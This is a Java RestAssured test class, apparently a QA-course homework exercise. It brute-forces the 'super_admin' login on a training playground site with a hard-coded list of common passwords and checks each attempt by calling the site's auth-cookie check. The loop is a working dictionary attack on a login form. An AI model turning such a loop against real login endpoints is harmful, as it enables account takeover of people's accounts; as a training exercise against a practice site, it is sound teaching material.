import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;

public class Home9 {

    @Test
    public void testPasswordBruteForce() {
        String login = "super_admin";

        List<String> passwords = Arrays.asList(
                "123456", "password", "123456789", "12345678", "12345",
                "1234567", "1234567890", "qwerty", "abc123", "111111",
                "123123", "admin", "letmein", "welcome", "monkey",
                "password1", "1234", "123456789", "12345678", "12345",
                "1234567", "1234567890", "abc123", "111111",
                "football", "dragon", "baseball", "sunshine", "iloveyou",
                "trustno1", "princess", "adobe123", "123123", "login", "qwerty123",
                "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop",
                "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555",
                "passw0rd", "shadow", "lovely", "7777777", "michael", "jesus", "password1", "superman", "hello",
                "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme",
                "whatever", "donald", "batman", "zaq1zaq1", "000000", "123qwe"

        );

        for (String password : passwords) {

            Response authResponse = RestAssured
                    .given()
                    .formParam("login", login)
                    .formParam("password", password)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework");


            String authCookie = authResponse.getCookie("auth_cookie");


            Response checkResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie");


            String checkResult = checkResponse.getBody().asString();

            if (checkResult.equals("You are authorized")) {
                System.out.println("Пароль найден: " + password);
                System.out.println("Результат проверки: " + checkResult);
                return;
            }
        }

    }
}